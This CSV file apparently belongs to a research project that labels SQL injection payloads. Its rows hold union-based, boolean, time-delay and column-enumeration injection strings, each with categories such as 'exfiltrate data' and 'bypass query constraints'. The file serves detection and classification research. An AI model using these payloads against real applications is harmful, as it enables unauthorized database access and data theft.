row_id,source_dataset,source_file,raw_label,raw_sql,sql_normalized,input_type,main_verb,target_tables,target_columns,initial_category,initial_impact,initial_intent,canonical_intent,attack_effect_initial,prompt_style,review_flag_unknown_verb,review_flag_empty_canonical_intent,review_flag_no_target_tables,review_flag_suspect_row,keep,dialect_guess,manual_category,manual_impact,manual_intent,target_table_canonical,prompt_domain_entity,expected_sql_operation,expected_security_violation,requires_sensitive_table,notes,semantic_category,semantic_impact,semantic_intent,semantic_canonical_intent,attack_technique,expected_security_violation.1,uses_union,uses_subquery,uses_stacked_query,uses_comment_termination,uses_time_function,uses_schema_enumeration,problematic_annotation,expected_missing_verb_for_fragment,expected_missing_table_for_fragment,review_flag_problematic_row,target_table_primary,target_num_prompts
10210,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1526""  )   where 4870  =  4870 union all select 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#","-1526"" ) WHERE 4870 = 4870 UNION ALL SELECT 4870,4870,4870,4870,4870,4870,4870,4870,4870,4870#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
6272,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1366' or make_set  (  9354  =  9354,7185  )   and 'abre'  =  'abre","-1366' OR MAKE_SET ( 9354 = 9354,7185 ) AND 'ABRE' = 'ABRE",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
6530,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9227  )   where 6723  =  6723 union all select 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--","-9227 ) WHERE 6723 = 6723 UNION ALL SELECT 6723,6723,6723,6723,6723,6723,6723,6723,6723,6723--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1503,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'   )    )     )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' ) ) ) AND 8148 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
8503,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-6770'   )    )    union all select 1845,1845,1845,1845,1845,1845,1845,1845,1845#","-6770' ) ) UNION ALL SELECT 1845,1845,1845,1845,1845,1845,1845,1845,1845#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
11172,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4550""  )   as hlwe where 6026  =  6026 or   (  9364  =  9593  )  *9593--","-4550"" ) AS HLWE WHERE 6026 = 6026 OR ( 9364 = 9593 ) *9593--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
3325,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6408  =  6408 union all select null,null,null,null,null,null,null,null--","1 WHERE 6408 = 6408 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
7182,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9062"" or 6872  =  6872 and ""aumq"" like ""aumq","-9062"" OR 6872 = 6872 AND ""AUMQ"" LIKE ""AUMQ",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3339,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4355""   )    )     )   or 9323  =  9323#","-4355"" ) ) ) OR 9323 = 9323#",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5166,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#","-9615 ) AS DNTK WHERE 4780 = 4780 UNION ALL SELECT 4780,4780,4780,4780,4780,4780,4780,4780#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2001,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-6754'  )   where 8388  =  8388 union all select 8388,8388,8388,8388,8388--","-6754' ) WHERE 8388 = 8388 UNION ALL SELECT 8388,8388,8388,8388,8388--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1306,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1   )    )     )   or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --","1 ) ) ) OR CHAR ( 119 ) ||CHAR ( 100 ) ||CHAR ( 99 ) ||CHAR ( 121 ) = REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 1441 ) ,0 ) ,5000000000 ) ,NULL ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10516,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   where 8835  =  8835 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --","1' ) WHERE 8835 = 8835 OR 8384 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
8044,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-9672%""   )    )     )   order by 1#","-9672%"" ) ) ) ORDER BY 1#",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
5550,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%'   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --","1%' ) ) ) OR 7427 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 116 ) ||CHR ( 87 ) ||CHR ( 90 ) ||CHR ( 109 ) ,5 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7257,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--","-2305' IN BOOLEAN MODE ) UNION ALL SELECT 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
2540,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""  )   as ssbz where 8885  =  8885 union all select null,null,null,null,null,null,null,null,null--","1"" ) AS SSBZ WHERE 8885 = 8885 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
998,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-7562  )   or 8571  =  8571--,-7562 ) OR 8571 = 8571--,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
11134,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1' and   (  3020  =  3020  )  *6703 and 'qsrz'  =  'qsrz,1' AND ( 3020 = 3020 ) *6703 AND 'QSRZ' = 'QSRZ,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
1994,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,-2241  )   where 7606  =  7606 or   (  8459  =  8459  )  *4906--,-2241 ) WHERE 7606 = 7606 OR ( 8459 = 8459 ) *4906--,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10438,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-4330' union all select 3059,3059,3059,3059,3059,3059,3059,3059,3059--","-4330' UNION ALL SELECT 3059,3059,3059,3059,3059,3059,3059,3059,3059--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
10296,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 7775  =  7775 union all select null,null,null,null--","1 ) WHERE 7775 = 7775 UNION ALL SELECT NULL,NULL,NULL,NULL--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
3323,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7238%' or make_set  (  5375  =  9563,9563  )   and '%'  =  '","-7238%' OR MAKE_SET ( 5375 = 9563,9563 ) AND '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
5651,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-1187'  )   union all select 8202,8202,8202,8202,8202,8202,8202#","-1187' ) UNION ALL SELECT 8202,8202,8202,8202,8202,8202,8202#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
10845,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr","CALL REGEXP_SUBSTRING ( REPEAT ( RIGHT ( CHAR ( 3702 ) ,0 ) ,500000000 ) ,NULL ) AND ""RUGR"" = ""RUGR",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4894,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1  )   where 8302  =  8302 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --","1 ) WHERE 8302 = 8302 OR 2633 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 112 ) ||CHR ( 65 ) ||CHR ( 65 ) ||CHR ( 103 ) ,5 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
4071,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )    and 4242  =  5831 and    (    (   'xflh' like 'xflh,1' ) ) AND 4242 = 5831 AND ( ( 'XFLH' LIKE 'XFLH,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4169,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'   )    )     )   and 4595  =  4595#,1' ) ) ) AND 4595 = 4595#,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7240,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1""   )    )    as eagr where 3366  =  3366 and elt  (  4249  =  4249,7259  )  --","1"" ) ) AS EAGR WHERE 3366 = 3366 AND ELT ( 4249 = 4249,7259 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
2317,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-5379'  )   union all select 4294,4294,4294--","-5379' ) UNION ALL SELECT 4294,4294,4294--",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
9521,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 where 6965  =  6965 and elt  (  3933  =  1232,1232  )  --","1 WHERE 6965 = 6965 AND ELT ( 3933 = 1232,1232 ) --",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
10071,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,1'  )   and   (  3020  =  3020  )  *6703 and   (  'botl' like 'botl,1' ) AND ( 3020 = 3020 ) *6703 AND ( 'BOTL' LIKE 'BOTL,injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
4155,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1"" where 4298  =  4298 order by 1--","1"" WHERE 4298 = 4298 ORDER BY 1--",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
7446,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1'  )   and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )","1' ) AND 3202 = LIKE ( 'ABCDEFG',UPPER ( HEX ( RANDOMBLOB ( 500000000/2 ) ) ) )",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
3935,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1%'  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  '%'  =  '","1%' ) AND 6537 = DBMS_PIPE.RECEIVE_MESSAGE ( CHR ( 76 ) ||CHR ( 116 ) ||CHR ( 117 ) ||CHR ( 65 ) ,5 ) AND ( '%' = '",injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,boolean_like_fragment,policy,False,False,False,False,False,False,False,True,True,False,,3
8412,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"-7083 union all select 7705,7705,7705,7705,7705#","-7083 UNION ALL SELECT 7705,7705,7705,7705,7705#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
1089,Modified_SQL_Dataset,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\Modified_SQL_Dataset.csv,1,"1 union all select null,null#","1 UNION ALL SELECT NULL,NULL#",injection_fragment,SELECT,,,T1,confidentiality,exfiltrate data,exfiltrate data from unknown_table,T1,,False,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,comment_terminated_fragment,policy,False,False,False,True,False,False,False,False,True,False,,3
31697,sqliv2,C:\Users\Polyana\Documents\pesquisa-P2SQL\data\raw\sqliv2.csv,1,' or 1 --',' OR 1 --',injection_fragment,UNKNOWN,,,T?,unknown,unknown malicious action,unknown malicious action,,,True,False,True,True,,,,,,,,,,,,T4,policy,bypass query constraints,bypass query constraints,quote_termination_fragment,policy,False,False,False,True,False,False,False,True,True,False,,3
